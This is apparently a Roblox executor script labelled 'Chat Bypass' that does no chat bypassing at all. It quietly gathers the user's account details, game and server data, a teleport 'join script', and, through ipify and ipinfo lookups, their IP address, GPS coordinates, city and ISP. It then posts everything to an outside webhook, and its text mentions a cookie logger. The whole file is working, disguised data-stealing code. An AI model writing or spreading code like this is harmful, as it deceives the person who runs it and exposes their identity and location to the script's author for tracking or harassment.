getgenv().whscript = "Chat Bypass"
getgenv().webhookexecUrl = "https://customwebhook.vercel.app/api/webhook"
getgenv().ExecLogSecret = true

local ui = gethui()
local folderName = "screen"
local folder = Instance.new("Folder")
folder.Name = folderName
folder.Parent = ui

local player = game:GetService("Players").LocalPlayer
local players = game:GetService("Players")
local userid = player.UserId
local gameid = game.PlaceId
local jobid = tostring(game.JobId)
local gameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local deviceType = game:GetService("UserInputService"):GetPlatform() == Enum.Platform.Windows and "PC 💻" or "Mobile 📱"
local snipePlay = "game:GetService('TeleportService'):TeleportToPlaceInstance(" .. gameid .. ", '" .. jobid .. "', player)"
local completeTime = os.date("%Y-%m-%d %H:%M:%S")
local workspace = game:GetService("Workspace")
local screenWidth = math.floor(workspace.CurrentCamera.ViewportSize.X)
local screenHeight = math.floor(workspace.CurrentCamera.ViewportSize.Y)
local memoryUsage = game:GetService("Stats"):GetTotalMemoryUsageMb()
local playerCount = #players:GetPlayers()
local maxPlayers = players.MaxPlayers
local health = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.Health or "N/A"
local maxHealth = player.Character and player.Character:FindFirstChild("Humanoid") and player.Character.Humanoid.MaxHealth or "N/A"
local position = player.Character and player.Character:FindFirstChild("HumanoidRootPart") and player.Character.HumanoidRootPart.Position or "N/A"
local gameVersion = game.PlaceVersion
local pingValue = tonumber(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("(%d+)")) or "N/A"

local function checkPremium()
    local success, response = pcall(function() return player.MembershipType end)
    return success and (response == Enum.MembershipType.None and "false" or "true") or "Failed to retrieve Membership:"
end

local url = getgenv().webhookexecUrl
local data = {
    ["content"] = "@everyone",
    ["content_2"] = true,
    ["embeds"] = {{
        ["title"] = "MADE BY DXFC | 🚀 **Script Execution Detected | Exec Log**",
        ["description"] = "*✅ One of the Script's has been Executed.(🍪COOKIE LOGGER IS PATCHED FOR NOW!):*",
        ["type"] = "rich",
        ["color"] = tonumber(0xe67e22),
        ["fields"] = {
            {["name"] = "🔍 **Script Info**", ["value"] = "```💻 Script Name: " .. getgenv().whscript .. "\n⏰ Executed At: " .. completeTime .. "```", ["inline"] = false},
            {["name"] = "👤 **Player Details**", ["value"] = "```🧸 Username: " .. player.Name .. "\n📝 Display Name: " .. player.DisplayName .. "\n🆔 UserID: " .. userid .. "\n❤️ Health: " .. health .. " / " .. maxHealth .. "\n🔗 Profile: View Profile (https://www.roblox.com/users/" .. userid .. "/profile)```", ["inline"] = false},
            {["name"] = "📅 **Account Information**", ["value"] = "```🗓️ Account Age: " .. player.AccountAge .. " days\n💎 Premium Status: " .. checkPremium() .. "\n📅 Account Created: " .. os.date("%Y-%m-%d", os.time() - (player.AccountAge * 86400)) .. "```", ["inline"] = false},
            {["name"] = "🎮 **Game Details**", ["value"] = "```🏷️ Game Name: " .. gameName .. "\n🆔 Game ID: " .. gameid .. "\n🔗 Game Link (https://www.roblox.com/games/" .. gameid .. ")\n🔢 Game Version: " .. gameVersion .. "```", ["inline"] = false},
            {["name"] = "🕹️ **Server Info**", ["value"] = "```👥 Players in Server: " .. playerCount .. " / " .. maxPlayers .. "\n🕒 Server Time: " .. os.date("%H:%M:%S") .. "```", ["inline"] = true},
            {["name"] = "📡 **Network Info**", ["value"] = "```📶 Ping: " .. pingValue .. " ms```", ["inline"] = true},
            {["name"] = "🖥️ **System Info**", ["value"] = "```📺 Resolution: " .. screenWidth .. "x" .. screenHeight .. "\n🔍 Memory Usage: " .. memoryUsage .. " MB\n⚙️ Executor: " .. identifyexecutor() .. "```", ["inline"] = true},
            {["name"] = "📍 **Character Position Script**", ["value"] = "```game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(" .. tostring(position) .. "))```\n", ["inline"] = true},
            {["name"] = "🪧 **Join Script**", ["value"] = "```lua\n" .. snipePlay .. "```", ["inline"] = false}
        },
        ["thumbnail"] = {["url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278795377176346684/IMG_5005.gif?ex=66d21a80&is=66d0c900&hm=8eb3f7689d767e13d36c7eb8ed4bead77728f874fee7f059d5edabf5fccd79aa&"},
        ["footer"] = {["text"] = "Made by dxfc with ❤️ | " .. os.date("%Y-%m-%d %H:%M:%S"), ["icon_url"] = "https://cdn.discordapp.com/attachments/1275846172862578853/1278792866495463454/IMG_5003.gif?ex=66d2182a&is=66d0c6aa&hm=3b55a9e00514d207da9067e03e8a84dff72ec35dd06b7be9e5e9974a5be8e980&"}
    }}
}

if getgenv().ExecLogSecret then
    local ipinfo_table = game.HttpService:JSONDecode(game:HttpGet("https://ipinfo.io/" .. game:HttpGet("https://api.ipify.org") .. "/json"))
    table.insert(data.embeds[1].fields, {["name"] = "**`(🤫) Secret`**", ["value"] = "||(👣) IP Address: " .. ipinfo_table.ip .. "||\n||(🌆) Country: " .. ipinfo_table.country .. "||\n||(🪟) GPS Location: " .. ipinfo_table.loc .. "||\n||(🏙️) City: " .. ipinfo_table.city .. "||\n||(🏡) Region: " .. ipinfo_table.region .. "||\n||(🪢) Hoster: " .. ipinfo_table.org .. "||"})
end

local newdata = game:GetService("HttpService"):JSONEncode(data)
local headers = {["content-type"] = "application/json"}
local request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
request({Url = url, Body = newdata, Method = "POST", Headers = headers})
